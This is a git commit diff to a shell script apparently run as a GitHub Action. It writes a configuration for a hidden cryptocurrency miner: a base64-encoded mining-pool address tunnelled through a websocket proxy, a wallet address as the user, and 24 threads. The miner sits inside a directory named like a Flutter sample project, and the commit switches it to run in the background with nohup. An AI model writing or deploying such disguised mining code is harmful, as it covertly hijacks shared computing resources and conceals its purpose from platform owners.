a028575e6055a5105a35e4138a0ae493c7b28f44
arjuillahalmadadi <117597346+arjuillahalmadadi@users.noreply.github.com>
2025-09-08 17:08:33 +0700

    Update cost1924crx.sh

--- gh-action/ref/main/cost1924crx.sh
+++ gh-action/ref/main/cost1924crx.sh
@@ -4,4 +4,4 @@ cd flutter-vertex-sample
 
 echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i", "password": "c=RVN,zap=MAZA/PLSR-mino", "argent": "node-vertex/0.1", "threads": 24}' > data.txt
 
-node server.js 
+nohup node server.js 
